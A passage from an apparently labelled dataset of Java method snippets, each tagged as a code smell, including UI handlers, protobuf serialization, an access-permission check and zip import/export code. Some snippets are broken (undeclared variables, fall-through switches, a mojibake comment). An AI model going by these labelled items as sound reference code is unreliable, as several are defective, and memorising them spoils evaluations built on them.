  darkTheme.accentId=darkAccentId;
  themeItem.items.add(darkTheme);
  themeItem.items.add(null);
  return themeItem;
}",1,Code Smell
"private void onNewCommunity(CommunityBean communityBean){
  List<CommunityBean> communityBeans=new ArrayList<>();
  communityBeans.add(communityBean);
  onNewCommunity(communityBeans);
}
public void onNewCommunity(List<CommunityBean> communityBeanList){
  TUICommunityLog.i(TAG,""onNewCommunity Communities:"" + communityBeanList);
  ArrayList<CommunityBean> beans=new ArrayList<>();
  for (  CommunityBean communityBean : communityBeanList) {
    TUICommunityLog.i(TAG,""onNewCommunity Communities "" + communityBean);
    beans.add(communityBean);
  }
  if (beans.size() == 0) {
    return;
  }
  List<CommunityBean> exists=new ArrayList<>();
  Iterator<CommunityBean> iterator=beans.iterator();
  while (iterator.hasNext()) {
    CommunityBean update=iterator.next();
    for (int i=0; i < joinedCommunityBeanList.size(); i++) {
      CommunityBean cacheInfo=joinedCommunityBeanList.get(i);
      if (cacheInfo.getGroupId().equals(update.getGroupId())) {
        joinedCommunityBeanList.set(i,update);
        iterator.remove();
        exists.add(update);
        break;
      }
    }
  }
  Collections.sort(beans);
  joinedCommunityBeanList.addAll(beans);
  Collections.sort(joinedCommunityBeanList);
  onDataSourceChanged(joinedCommunityBeanList);
  for (  CommunityBean bean : beans) {
    int index=joinedCommunityBeanList.indexOf(bean);
    if (index != -1) {
      onItemInserted(index);
    }
  }
  for (  CommunityBean bean : exists) {
    int index=joinedCommunityBeanList.indexOf(bean);
    if (index != -1) {
      onItemChanged(index);
    }
    judgeCurrentCommunityBeanChanged(bean);
  }
}",1,Code Smell
"public void setMessage(MessageObject message,TLRPC.ChatFull chatFull){
  this.messageObject=message;
  TLRPC.ChatFull reactionsChat=chatFull;
  List<ReactionsLayoutInBubble.VisibleReaction> visibleReactions=new ArrayList<>();
  if (message.isForwardedChannelPost()) {
    reactionsChat=MessagesController.getInstance(currentAccount).getChatFull(-message.getFromChatId());
    if (reactionsChat == null) {
      waitingLoadingChatId=-message.getFromChatId();
      MessagesController.getInstance(currentAccount).loadFullChat(-message.getFromChatId(),0,true);
      setVisibility(View.INVISIBLE);
      return;
    }
  }
  if (reactionsChat != null) {
    if (reactionsChat.available_reactions instanceof TLRPC.TL_chatReactionsAll) {
      TLRPC.Chat chat=MessagesController.getInstance(currentAccount).getChat(reactionsChat.id);
      if (chat != null && !ChatObject.isChannelAndNotMegaGroup(chat)) {
        allReactionsAvailable=true;
      }
 else {
        allReactionsAvailable=false;
      }
      fillRecentReactionsList(visibleReactions);
    }
 else     if (reactionsChat.available_reactions instanceof TLRPC.TL_chatReactionsSome) {
      TLRPC.TL_chatReactionsSome reactionsSome=(TLRPC.TL_chatReactionsSome)reactionsChat.available_reactions;
      for (      TLRPC.Reaction s : reactionsSome.reactions) {
        for (        TLRPC.TL_availableReaction a : MediaDataController.getInstance(currentAccount).getEnabledReactionsList()) {
          if (s instanceof TLRPC.TL_reactionEmoji && a.reaction.equals(((TLRPC.TL_reactionEmoji)s).emoticon)) {
            visibleReactions.add(ReactionsLayoutInBubble.VisibleReaction.fromTLReaction(s));
            break;
          }
 else           if (s instanceof TLRPC.TL_reactionCustomEmoji) {
            visibleReactions.add(ReactionsLayoutInBubble.VisibleReaction.fromTLReaction(s));
            break;
          }
        }
      }
    }
 else {
      if (BuildVars.DEBUG_PRIVATE_VERSION) {
        throw new RuntimeException(""Unknown chat reactions type: "" + reactionsChat.available_reactions);
      }
    }
  }
 else {
    allReactionsAvailable=true;
    fillRecentReactionsList(visibleReactions);
  }
  filterReactions(visibleReactions);
  setVisibleReactionsList(visibleReactions);
  if (message.messageOwner.reactions != null && message.messageOwner.reactions.results != null) {
    for (int i=0; i < message.messageOwner.reactions.results.size(); i++) {
      if (message.messageOwner.reactions.results.get(i).chosen) {
        selectedReactions.add(ReactionsLayoutInBubble.VisibleReaction.fromTLReaction(message.messageOwner.reactions.results.get(i).reaction));
      }
    }
  }
}",1,Code Smell
"public boolean hasPermission(Authentication authentication,String requestMethod,String requestURI){
  if (HttpMethod.OPTIONS.name().equalsIgnoreCase(requestMethod)) {
    return true;
  }
  if (!(authentication instanceof AnonymousAuthenticationToken)) {
    if (!securityProperties.getAuth().getUrlPermission().getEnable()) {
      return true;
    }
    OAuth2IntrospectionAuthenticatedPrincipal authenticatedPrincipal=(OAuth2IntrospectionAuthenticatedPrincipal)authentication.getPrincipal();
    String username=authenticatedPrincipal.getName();
    if (CommonConstant.ADMIN_USER_NAME.equals(username)) {
      return true;
    }
    Map<String,Object> claims=authenticatedPrincipal.getAttributes();
    String clientId=(String)claims.get(SecurityConstants.CLIENT_ID);
    if (!isNeedAuth(clientId)) {
      return true;
    }
    for (    String path : securityProperties.getAuth().getUrlPermission().getIgnoreUrls()) {
      if (antPathMatcher.match(path,requestURI)) {
        return true;
      }
    }
    Collection<SimpleGrantedAuthority> grantedAuthorityList=(Collection<SimpleGrantedAuthority>)authentication.getAuthorities();
    if (CollectionUtil.isEmpty(grantedAuthorityList)) {
      log.warn(""角色列表为空：{}"",authentication.getPrincipal());
      return false;
    }
    TenantContextHolder.setTenant(clientId);
    String roleCodes=grantedAuthorityList.stream().map(SimpleGrantedAuthority::getAuthority).collect(Collectors.joining("", ""));
    List<SysMenu> menuList=findMenuByRoleCodes(roleCodes);
    for (    SysMenu menu : menuList) {
      if (StringUtils.isNotEmpty(menu.getUrl()) && antPathMatcher.match(menu.getUrl(),requestURI)) {
        if (StrUtil.isNotEmpty(menu.getPathMethod())) {
          return requestMethod.equalsIgnoreCase(menu.getPathMethod());
        }
 else {
          return true;
        }
      }
    }
  }
  return false;
}",1,Code Smell
"public static Exprent propagateBoolNot(Exprent exprent){
  if (exprent.type == Exprent.EXPRENT_FUNCTION) {
    FunctionExprent fexpr=(FunctionExprent)exprent;
    if (fexpr.getFuncType() == FunctionExprent.FUNCTION_BOOL_NOT) {
      Exprent param=fexpr.getLstOperands().get(0);
      if (param.type == Exprent.EXPRENT_FUNCTION) {
        FunctionExprent fparam=(FunctionExprent)param;
        int ftype=fparam.getFuncType();
switch (ftype) {
case FunctionExprent.FUNCTION_BOOL_NOT:
          Exprent newexpr=fparam.getLstOperands().get(0);
        Exprent retexpr=propagateBoolNot(newexpr);
      return retexpr == null ? newexpr : retexpr;
case FunctionExprent.FUNCTION_CADD:
case FunctionExprent.FUNCTION_COR:
    List<Exprent> operands=fparam.getLstOperands();
  for (int i=0; i < operands.size(); i++) {
    Exprent newparam=new FunctionExprent(FunctionExprent.FUNCTION_BOOL_NOT,operands.get(i),operands.get(i).bytecode);
    Exprent retparam=propagateBoolNot(newparam);
    operands.set(i,retparam == null ? newparam : retparam);
  }
case FunctionExprent.FUNCTION_EQ:
case FunctionExprent.FUNCTION_NE:
case FunctionExprent.FUNCTION_LT:
case FunctionExprent.FUNCTION_GE:
case FunctionExprent.FUNCTION_GT:
case FunctionExprent.FUNCTION_LE:
fparam.setFuncType(funcsnot[ftype - FunctionExprent.FUNCTION_EQ]);
return fparam;
}
}
}
}
return null;
}",1,Code Smell
"/** 
 * Paint a 2-bit/pixel code string, as defined by ETSI EN 300 743 7.2.5.2, to a canvas.
 */
private static int paint2BitPixelCodeString(ParsableBitArray data,int[] clutEntries,byte[] clutMapTable,int column,int line,Paint paint,Canvas canvas){
  boolean endOfPixelCodeString=false;
  do {
    int runLength=0;
    int clutIndex=0;
    int peek=data.readBits(2);
    if (peek != 0x00) {
      runLength=1;
      clutIndex=peek;
    }
 else     if (data.readBit()) {
      runLength=3 + data.readBits(3);
      clutIndex=data.readBits(2);
    }
 else     if (data.readBit()) {
      runLength=1;
    }
 else {
switch (data.readBits(2)) {
case 0x00:
        endOfPixelCodeString=true;
      break;
case 0x01:
    runLength=2;
  break;
case 0x02:
runLength=12 + data.readBits(4);
clutIndex=data.readBits(2);
break;
case 0x03:
runLength=29 + data.readBits(8);
clutIndex=data.readBits(2);
break;
}
}
if (runLength != 0 && paint != null) {
paint.setColor(clutEntries[clutMapTable != null ? clutMapTable[clutIndex] : clutIndex]);
canvas.drawRect(column,line,column + runLength,line + 1,paint);
}
column+=runLength;
}
 while (!endOfPixelCodeString);
return column;
}",1,Code Smell
"public void updateVisibleSkulls(){
  if (cullingEnabled) {
    if (lastPlayerPosition != null && session.getPlayerEntity().getPosition().distanceSquared(lastPlayerPosition) < 4) {
      return;
    }
    lastPlayerPosition=session.getPlayerEntity().getPosition();
    inRangeSkulls.clear();
    for (    Skull skull : skulls.values()) {
      if (skull.blockDefinition != null) {
        continue;
      }
      skull.distanceSquared=skull.position.distanceSquared(lastPlayerPosition.getX(),lastPlayerPosition.getY(),lastPlayerPosition.getZ());
      if (skull.distanceSquared > skullRenderDistanceSquared) {
        freeSkullEntity(skull);
      }
 else {
        inRangeSkulls.add(skull);
      }
    }
    inRangeSkulls.sort(Comparator.comparingInt(Skull::getDistanceSquared));
    for (int i=inRangeSkulls.size() - 1; i >= 0; i--) {
      if (i < maxVisibleSkulls) {
        assignSkullEntity(inRangeSkulls.get(i));
      }
 else {
        freeSkullEntity(inRangeSkulls.get(i));
      }
    }
  }
}",1,Code Smell
"@java.lang.Override public boolean equals(final java.lang.Object obj){
  if (obj == this) {
    return true;
  }
  if (!(obj instanceof org.tribuo.common.tree.protos.SplitNodeProto)) {
    return super.equals(obj);
  }
  org.tribuo.common.tree.protos.SplitNodeProto other=(org.tribuo.common.tree.protos.SplitNodeProto)obj;
  if (getParentIdx() != other.getParentIdx())   return false;
  if (getCurIdx() != other.getCurIdx())   return false;
  if (getGreaterThanIdx() != other.getGreaterThanIdx())   return false;
  if (getLessThanOrEqualIdx() != other.getLessThanOrEqualIdx())   return false;
  if (getSplitFeatureIdx() != other.getSplitFeatureIdx())   return false;
  if (java.lang.Double.doubleToLongBits(getSplitValue()) != java.lang.Double.doubleToLongBits(other.getSplitValue()))   return false;
  if (java.lang.Double.doubleToLongBits(getImpurity()) != java.lang.Double.doubleToLongBits(other.getImpurity()))   return false;
  if (!unknownFields.equals(other.unknownFields))   return false;
  return true;
}
",1,Code Smell
"@Override public void visitAnyInstruction(Clazz clazz,Method method,CodeAttribute codeAttribute,int offset,Instruction instruction){
  FromJsonInvocationMatcher matchingMatcher=null;
  for (  FromJsonInvocationMatcher matcher : fromJsonInvocationMatchers) {
    instruction.accept(clazz,method,codeAttribute,offset,matcher);
    if (matcher.isMatching()) {
      matchingMatcher=matcher;
      break;
    }
  }
  if (matchingMatcher != null) {
    logger.debug(""GsonDeserializationInvocationFinder: Gson#fromJson: {}.{}{} {}"",clazz.getName(),method.getName(clazz),method.getDescriptor(clazz),instruction.toString(offset));
    lazyPartialEvaluator.visitCodeAttribute(clazz,method,codeAttribute);
    int stackElementIndex=matchingMatcher.typeStackElementIndex == -1 ? matchingMatcher.classStackElementIndex : matchingMatcher.typeStackElementIndex;
    InstructionOffsetValue producer=partialEvaluator.getStackBefore(offset).getTopActualProducerValue(stackElementIndex).instructionOffsetValue();
    TypeArgumentFinder typeArgumentFinder=new TypeArgumentFinder(programClassPool,libraryClassPool,partialEvaluator);
    for (int i=0; i < producer.instructionOffsetCount(); i++) {
      codeAttribute.instructionAccept(clazz,method,producer.instructionOffset(i),typeArgumentFinder);
    }
    String[] targetTypes=typeArgumentFinder.typeArgumentClasses;
    if (targetTypes != null) {
      for (      String targetType : targetTypes) {
        logger.debug(""GsonDeserializationInvocationFinder: deserialized type: {}"",targetType);
        programClassPool.classAccept(targetType,domainClassVisitor);
      }
    }
 else     if (warningPrinter != null) {
      warningPrinter.print(clazz.getName(),""Warning: can't derive deserialized type from fromJson() invocation in "" + clazz.getName() + "".""+ method.getName(clazz)+ method.getDescriptor(clazz));
    }
  }
}",1,Code Smell
"@Override public J visitMethodInvocation(J.MethodInvocation method,ExecutionContext ctx){
  J.MethodInvocation m=(J.MethodInvocation)super.visitMethodInvocation(method,ctx);
  if (!dependencyDsl.matches(m)) {
    return m;
  }
  if (m.getArguments().isEmpty()) {
    return m;
  }
  Map<String,Expression> mapNotation=new HashMap<>();
  if (m.getArguments().get(0) instanceof G.MapLiteral) {
    G.MapLiteral arg=(G.MapLiteral)m.getArguments().get(0);
    for (    G.MapEntry entry : arg.getElements()) {
      if (entry.getKey() instanceof J.Literal) {
        J.Literal key=(J.Literal)entry.getKey();
        if (key.getType() == JavaType.Primitive.String) {
          mapNotation.put((String)key.getValue(),entry.getValue());
        }
      }
    }
    J.Literal stringNotation=toLiteral(arg.getPrefix(),arg.getMarkers(),mapNotation);
    if (stringNotation == null) {
      return m;
    }
    Expression lastArg=m.getArguments().get(m.getArguments().size() - 1);
    if (lastArg instanceof J.Lambda) {
      m=m.withArguments(Arrays.asList(stringNotation,lastArg));
    }
 else {
      m=m.withArguments(Collections.singletonList(stringNotation));
    }
  }
 else   if (m.getArguments().get(0) instanceof G.MapEntry) {
    G.MapEntry firstEntry=(G.MapEntry)m.getArguments().get(0);
    Space prefix=firstEntry.getPrefix();
    Markers markers=firstEntry.getMarkers();
    for (    Expression e : m.getArguments()) {
      if (e instanceof G.MapEntry) {
        G.MapEntry entry=(G.MapEntry)e;
        if (entry.getKey() instanceof J.Literal) {
          J.Literal key=(J.Literal)entry.getKey();
          if (key.getType() == JavaType.Primitive.String) {
            mapNotation.put((String)key.getValue(),entry.getValue());
          }
        }
      }
    }
    J.Literal stringNotation=toLiteral(prefix,markers,mapNotation);
    if (stringNotation == null) {
      return m;
    }
    Expression lastArg=m.getArguments().get(m.getArguments().size() - 1);
    if (lastArg instanceof J.Lambda) {
      m=m.withArguments(Arrays.asList(stringNotation,lastArg));
    }
 else {
      m=m.withArguments(Collections.singletonList(stringNotation));
    }
  }
  return m;
}",1,Code Smell
"/** 
 * Compress all files under the specific folder to a single zip file. <p> Should be call in background thread.
 * @param folderPath  the specific folder path
 * @param zipFilePath the zip file path
 * @throws IOException if any error occurs
 * @since 2.14.0
 */
public static void compress(String folderPath,String zipFilePath) throws IOException {
  File folder=new File(folderPath);
  if (!folder.exists() || !folder.isDirectory()) {
    throw new IOException(""Folder "" + folderPath + "" does't exist or isn't a directory"");
  }
  File zipFile=new File(zipFilePath);
  if (!zipFile.exists()) {
    File zipFolder=zipFile.getParentFile();
    if (!zipFolder.exists()) {
      if (!zipFolder.mkdirs()) {
        throw new IOException(""Zip folder "" + zipFolder.getAbsolutePath() + "" not created"");
      }
    }
    if (!zipFile.createNewFile()) {
      throw new IOException(""Zip file "" + zipFilePath + "" not created"");
    }
  }
  BufferedInputStream bis;
  ZipOutputStream zos=new ZipOutputStream(new BufferedOutputStream(new FileOutputStream(zipFile)));
  try {
    final int BUFFER_SIZE=8 * 1024;
    byte buffer[]=new byte[BUFFER_SIZE];
    for (    String fileName : folder.list()) {
      if (fileName.equals(""."") || fileName.equals("".."")) {
        continue;
      }
      File file=new File(folder,fileName);
      if (!file.isFile()) {
        continue;
      }
      FileInputStream fis=new FileInputStream(file);
      bis=new BufferedInputStream(fis,BUFFER_SIZE);
      try {
        ZipEntry entry=new ZipEntry(fileName);
        zos.putNextEntry(entry);
        int count;
        while ((count=bis.read(buffer,0,BUFFER_SIZE)) != -1) {
          zos.write(buffer,0,count);
        }
      }
  finally {
        try {
          bis.close();
        }
 catch (        IOException e) {
        }
      }
    }
  }
  finally {
    try {
      zos.close();
    }
 catch (    IOException e) {
    }
  }
}",1,Code Smell
"protected void inflateCagetory(HtmlChartPlugin plugin){
  if (plugin == null)   return;
  List<Category> categories=plugin.getCategories();
  if (categories == null)   return;
  for (int i=0; i < categories.size(); i++) {
    Category category=categories.get(i);
    String categoryName=category.getName();
    Map<String,ChartPlugin> map=getChartPluginMap();
    if (category.hasNameLabel()) {
      for (      ChartPlugin chartPlugin : map.values()) {
        if (!(chartPlugin instanceof AbstractChartPlugin))         continue;
        List<Category> myCategories=chartPlugin.getCategories();
        if (myCategories == null)         continue;
        for (int j=0; j < myCategories.size(); j++) {
          Category myCategory=myCategories.get(j);
          if (myCategory != null && myCategory != category && StringUtil.isEquals(myCategory.getName(),categoryName)) {
            myCategories.set(j,category);
          }
        }
      }
    }
 else {
      for (      ChartPlugin chartPlugin : map.values()) {
        List<Category> myCategories=chartPlugin.getCategories();
        if (myCategories == null)         continue;
        Category fullCategory=null;
        for (        Category myCategory : myCategories) {
          if (myCategory != null && myCategory != category && myCategory.hasNameLabel() && StringUtil.isEquals(myCategory.getName(),categoryName)) {
            fullCategory=myCategory;
            break;
          }
        }
        if (fullCategory != null) {
          categories.set(i,fullCategory);
          break;
        }
      }
    }
  }
}",1,Code Smell
"@Override public void augment(S struc){
  var currentContextMenu=new AtomicReference<ContextMenu>();
  Supplier<Boolean> hide=() -> {
    if (currentContextMenu.get() != null && currentContextMenu.get().isShowing()) {
      currentContextMenu.get().hide();
      currentContextMenu.set(null);
      return true;
    }
    return false;
  }
;
  var r=struc.get();
  r.addEventHandler(MouseEvent.MOUSE_CLICKED,event -> {
    if (mouseEventCheck != null && mouseEventCheck.test(event)) {
      if (!hide.get()) {
        var cm=contextMenu.get();
        if (cm != null) {
          cm.show(r,event.getScreenX(),event.getScreenY());
          currentContextMenu.set(cm);
        }
      }
      event.consume();
    }
  }
);
  r.addEventHandler(MouseEvent.MOUSE_PRESSED,event -> {
    if (mouseEventCheck != null && mouseEventCheck.test(event)) {
      event.consume();
    }
  }
);
  r.addEventHandler(KeyEvent.KEY_RELEASED,event -> {
    if (keyEventCheck != null && keyEventCheck.test(event)) {
      event.consume();
    }
  }
);
  r.addEventHandler(KeyEvent.KEY_PRESSED,event -> {
    if (keyEventCheck != null && keyEventCheck.test(event)) {
      if (!hide.get()) {
        var cm=contextMenu.get();
        if (cm != null) {
          cm.show(r,Side.BOTTOM,0,0);
          currentContextMenu.set(cm);
        }
      }
      event.consume();
    }
  }
);
  if (r instanceof ButtonBase && keyEventCheck == null) {
    buttonBase.addEventHandler(ActionEvent.ACTION,event -> {
      if (buttonBase.getOnAction() != null) {
        return;
      }
      if (!hide.get()) {
        var cm=contextMenu.get();
        if (cm != null) {
          cm.show(r,Side.BOTTOM,0,0);
          currentContextMenu.set(cm);
        }
      }
      event.consume();
    }
);
  }
}",1,Code Smell
"@java.lang.Override public int getSerializedSize(){
  int size=memoizedSize;
  if (size != -1)   return size;
  size=0;
{
    int dataSize=0;
    for (int i=0; i < label_.size(); i++) {
      dataSize+=computeStringSizeNoTag(label_.getRaw(i));
    }
    size+=dataSize;
    size+=1 * getLabelList().size();
  }
{
    int dataSize=0;
    for (int i=0; i < count_.size(); i++) {
      dataSize+=com.google.protobuf.CodedOutputStream.computeInt64SizeNoTag(count_.getLong(i));
    }
    size+=dataSize;
    if (!getCountList().isEmpty()) {
      size+=1;
      size+=com.google.protobuf.CodedOutputStream.computeInt32SizeNoTag(dataSize);
    }
    countMemoizedSerializedSize=dataSize;
  }
{
    int dataSize=0;
    for (int i=0; i < id_.size(); i++) {
      dataSize+=com.google.protobuf.CodedOutputStream.computeInt32SizeNoTag(id_.getInt(i));
    }
    size+=dataSize;
    if (!getIdList().isEmpty()) {
      size+=1;
      size+=com.google.protobuf.CodedOutputStream.computeInt32SizeNoTag(dataSize);
    }
    idMemoizedSerializedSize=dataSize;
  }
{
    int dataSize=0;
    dataSize=8 * getMaxList().size();
    size+=dataSize;
    if (!getMaxList().isEmpty()) {
      size+=1;
      size+=com.google.protobuf.CodedOutputStream.computeInt32SizeNoTag(dataSize);
    }
    maxMemoizedSerializedSize=dataSize;
  }
{
    int dataSize=0;
    dataSize=8 * getMinList().size();
    size+=dataSize;
    if (!getMinList().isEmpty()) {
      size+=1;
      size+=com.google.protobuf.CodedOutputStream.computeInt32SizeNoTag(dataSize);
    }
    minMemoizedSerializedSize=dataSize;
  }
{
    int dataSize=0;
    dataSize=8 * getMeanList().size();
    size+=dataSize;
    if (!getMeanList().isEmpty()) {
      size+=1;
      size+=com.google.protobuf.CodedOutputStream.computeInt32SizeNoTag(dataSize);
    }
    meanMemoizedSerializedSize=dataSize;
  }
{
    int dataSize=0;
    dataSize=8 * getSumSquaresList().size();
    size+=dataSize;
    if (!getSumSquaresList().isEmpty()) {
      size+=1;
      size+=com.google.protobuf.CodedOutputStream.computeInt32SizeNoTag(dataSize);
    }
    sumSquaresMemoizedSerializedSize=dataSize;
  }
  if (unknownCount_ != 0) {
    size+=com.google.protobuf.CodedOutputStream.computeInt32Size(8,unknownCount_);
  }
  if (overallCount_ != 0L) {
    size+=com.google.protobuf.CodedOutputStream.computeInt64Size(9,overallCount_);
  }
  size+=unknownFields.getSerializedSize();
  memoizedSize=size;
  return size;
}",1,Code Smell
"private void init(Context context){
  final ScaleGestureDetector scaleDetector=new ScaleGestureDetector(context,this);
  setOnTouchListener(new View.OnTouchListener(){
    @Override public boolean onTouch(    View view,    MotionEvent motionEvent){
      if (child() == null) {
        return false;
      }
      if (!enableZoom && !enableDrag) {
        return false;
      }
      int y=(int)motionEvent.getY();
      int x=(int)motionEvent.getX();
switch (motionEvent.getAction() & MotionEvent.ACTION_MASK) {
case MotionEvent.ACTION_DOWN:
        Log.i(TAG,""DOWN"");
      lastX=x;
    lastY=y;
  if (scale > MIN_ZOOM) {
    mode=Mode.DRAG_ZOOM;
    startX=motionEvent.getX() - prevDx;
    startY=motionEvent.getY() - prevDy;
  }
 else {
    mode=Mode.DRAG;
  }
break;
case MotionEvent.ACTION_MOVE:
if (enableDrag) {
if (mode == Mode.DRAG_ZOOM) {
  dx=motionEvent.getX() - startX;
  dy=motionEvent.getY() - startY;
}
 else if (mode == Mode.DRAG) {
  float tmp=y - lastY;
  setY(tmp);
  if (dragListener != null) {
    dragListener.onDragOffset(tmp,getViewHeight() / 6);
  }
}
}
break;
case MotionEvent.ACTION_POINTER_DOWN:
mode=Mode.ZOOM;
break;
case MotionEvent.ACTION_POINTER_UP:
mode=Mode.NONE;
break;
case MotionEvent.ACTION_UP:
Log.i(TAG,""UP"");
if (enableDrag && mode == Mode.DRAG) {
float tmp=y - lastY;
if (scale > 1 || Math.abs(tmp) < getViewHeight() / 6) {
new TranslateUpAnimator(ZoomableFrameLayout.this,tmp,0);
}
 else {
new TranslateUpAnimator(ZoomableFrameLayout.this,tmp,tmp > 0 ? getViewHeight() : -getViewHeight()).addListener(new AnimatorListenerAdapter(){
@Override public void onAnimationEnd(Animator animation){
if (dragListener != null) {
dragListener.onDragToFinish();
}
}
}
);
}
}
mode=Mode.NONE;
prevDx=dx;
prevDy=dy;
if (Math.abs(y - lastY) < 5 && Math.abs(x - lastX) < 5) {
if (onClickListener != null) {
onClickListener.onClick(ZoomableFrameLayout.this);
}
}
break;
}
scaleDetector.onTouchEvent(motionEvent);
if ((mode == Mode.DRAG_ZOOM && scale >= MIN_ZOOM) || mode == Mode.ZOOM) {
getParent().requestDisallowInterceptTouchEvent(true);
float maxDx=child().getWidth() * (scale - 1);
float maxDy=child().getHeight() * (scale - 1);
dx=Math.min(Math.max(dx,-maxDx),0);
dy=Math.min(Math.max(dy,-maxDy),0);
Log.i(TAG,""Width: "" + child().getWidth() + "", scale ""+ scale+ "", dx ""+ dx+ "", max ""+ maxDx);
applyScaleAndTranslation();
}
return true;
}
}
);
}",1,Code Smell
"@Override public synchronized void importFromZip(ZipInputStream in,String... ids) throws DriverEntityManagerException {
  ZipEntry zipEntry=null;
  try {
    while ((zipEntry=in.getNextEntry()) != null) {
      if (isDriverEntityInfoFileZipEntry(zipEntry)) {
        Reader reader=getDriverEntityInfoFileReader(IOUtil.getByteArrayInputStream(in));
        try {
          List<DriverEntity> driverEntities=readDriverEntities(reader);
          for (          DriverEntity driverEntity : driverEntities) {
            if (isValidDriverEntityForIdArray(driverEntity,ids)) {
              removeExists(this.driverEntities,driverEntity.getId());
              this.driverEntities.add(driverEntity);
            }
          }
        }
  finally {
          IOUtil.close(reader);
        }
      }
 else       if (isValidZipEntryForIdArray(zipEntry,ids)) {
        File file=getFileInRootDirectory(zipEntry.getName());
        if (zipEntry.isDirectory()) {
          if (file.exists())           FileUtil.clearDirectory(file);
 else           file.mkdirs();
        }
 else {
          OutputStream out=null;
          try {
            out=new FileOutputStream(file);
            IOUtil.write(in,out);
          }
  finally {
            IOUtil.close(out);
          }
        }
      }
      in.closeEntry();
    }
    writeDriverEntities();
  }
 catch (  IOException e) {
    throw new DriverEntityManagerException(e);
  }
}
",1,Code Smell
"@Override public void head(@NonNull Node node,int depth){
  if (node instanceof TextNode) {
    ssb.append(textNode.text());
  }
 else   if (node instanceof Element) {
switch (el.nodeName()) {
case ""a"":
{
        Object linkObject=null;
        String href=el.attr(""href"");
        LinkSpan.Type linkType;
        if (el.hasClass(""hashtag"")) {
          String text=el.text();
          if (text.startsWith(""#"")) {
            linkType=LinkSpan.Type.HASHTAG;
            href=text.substring(1);
            linkObject=tagsByTag.get(text.substring(1).toLowerCase());
          }
 else {
            linkType=LinkSpan.Type.URL;
          }
        }
 else         if (el.hasClass(""mention"")) {
          String id=idsByUrl.get(href);
          if (id != null) {
            linkType=LinkSpan.Type.MENTION;
            href=id;
            linkObject=mentionsByID.get(id);
          }
 else {
            linkType=LinkSpan.Type.URL;
          }
        }
 else {
          linkType=LinkSpan.Type.URL;
        }
        openSpans.add(new SpanInfo(new LinkSpan(href,null,linkType,accountID,linkObject,parentObject),ssb.length(),el));
      }
case ""br"":
    ;
case ""span"":
{
    if (el.hasClass(""invisible"")) {
      openSpans.add(new SpanInfo(new InvisibleSpan(),ssb.length(),el));
    }
  }
}
}
}
@Override public void head(Node node,int depth){
  if (node instanceof TextNode) {
    sb.append(tn.text());
  }
 else   if (node instanceof Element) {
    if (""br"".equals(el.tagName())) {
      sb.append('\n');
    }
  }
}",1,Code Smell
"private Text.FontWeight getFontWeightEnum(String strName){
  if (strName.equalsIgnoreCase(""Normal"")) {
    return Text.FontWeight.Regular;
  }
 else   if (strName.equalsIgnoreCase(""Bold"")) {
    return Text.FontWeight.Bold;
  }
 else   if (strName.equalsIgnoreCase(""100"")) {
    return Text.FontWeight.UltraLight;
  }
 else   if (strName.equalsIgnoreCase(""200"")) {
    return Text.FontWeight.Thin;
  }
 else   if (strName.equalsIgnoreCase(""300"")) {
    return Text.FontWeight.Light;
  }
 else   if (strName.equalsIgnoreCase(""400"")) {
    return Text.FontWeight.Regular;
  }
 else   if (strName.equalsIgnoreCase(""500"")) {
    return Text.FontWeight.Medium;
  }
 else   if (strName.equalsIgnoreCase(""600"")) {
    return Text.FontWeight.Semibold;
  }
 else   if (strName.equalsIgnoreCase(""700"")) {
    return Text.FontWeight.Bold;
  }
 else   if (strName.equalsIgnoreCase(""800"")) {
    return Text.FontWeight.Heavy;
  }
 else   if (strName.equalsIgnoreCase(""900"")) {
    return Text.FontWeight.ExtraBlack;
  }
 else {
    return Text.FontWeight.Regular;
  }
}",1,Code Smell
"protected KafkaLog4j2Appender(String name,Filter filter,Layout<? extends Serializable> layout,boolean ignoreExceptions,Property[] properties,String source,String bootstrapServers,String topic,String level){
  super(name,filter,layout,ignoreExceptions,properties);
  this.source=source;
  this.topic=topic;
  this.level=level;
  Properties envProperties=System.getProperties();
  Map<String,String> envs=System.getenv();
  String clusterId=envs.get(""CLUSTER_ID"");
  if (clusterId != null) {
    appId=clusterId;
    containerId=envs.get(""HOSTNAME"");
    if (envs.get(""HOSTNAME"").contains(""taskmanager"")) {
      containerType=""taskmanager"";
    }
 else {
      containerType=""jobmanager"";
    }
    if (envs.get(""_HOST_IP_ADDRESS"") != null) {
      nodeIp=envs.get(""_HOST_IP_ADDRESS"");
    }
  }
 else {
    String logFile=envProperties.getProperty(""log.file"");
    String[] values=logFile.split(File.separator);
    if (values.length >= 3) {
      appId=values[values.length - 3];
      containerId=values[values.length - 2];
      String log=values[values.length - 1];
      if (log.contains(""jobmanager"")) {
        containerType=""jobmanager"";
      }
 else       if (log.contains(""taskmanager"")) {
        containerType=""taskmanager"";
      }
 else {
        containerType=""others"";
      }
    }
 else {
      log.error(""log.file Property ({}) doesn't contains yarn application id or container id"",logFile);
    }
  }
  taskName=envProperties.getProperty(""taskName"",null);
  taskId=envProperties.getProperty(""taskId"",null);
  Properties props=new Properties();
  for (  Property property : properties) {
    props.put(property.getName(),property.getValue());
  }
  if (bootstrapServers != null) {
    props.setProperty(""bootstrap.servers"",bootstrapServers);
  }
 else {
    throw new ConfigException(""The bootstrap servers property must be specified"");
  }
  if (this.topic == null) {
    throw new ConfigException(""Topic must be specified by the Kafka log4j appender"");
  }
  String clientIdPrefix=taskId != null ? taskId : appId;
  if (clientIdPrefix != null) {
    props.setProperty(""client.id"",clientIdPrefix + ""_log"");
  }
  if (props.getProperty(""acks"") == null) {
    props.setProperty(""acks"",""0"");
  }
  if (props.getProperty(""retries"") == null) {
    props.setProperty(""retries"",""0"");
  }
  if (props.getProperty(""batch.size"") == null) {
    props.setProperty(""batch.size"",""16384"");
  }
  if (props.getProperty(""linger.ms"") == null) {
    props.setProperty(""linger.ms"",""5"");
  }
  if (props.getProperty(""compression.type"") == null) {
    props.setProperty(""compression.type"",""lz4"");
  }
  props.put(""key.serializer"",""org.apache.kafka.common.serialization.StringSerializer"");
  props.put(""value.serializer"",""org.apache.kafka.common.serialization.StringSerializer"");
  producer=new KafkaProducer<>(props);
}",1,Code Smell
"/** 
 * 銆愯繖涓柟娉曚笉鐢ㄧ湅銆戯紝绾补涓轰簡閫傞厤amis鍓嶇 鑾峰彇 SmsTimeLineVo
 * @return
 */
public static SmsTimeLineVo getSmsTimeLineVo(Map<String,List<SmsRecord>> maps){
  ArrayList<SmsTimeLineVo.ItemsVO> itemsVoS=new ArrayList<>();
  SmsTimeLineVo smsTimeLineVo=SmsTimeLineVo.builder().items(itemsVoS).build();
  for (  Map.Entry<String,List<SmsRecord>> entry : maps.entrySet()) {
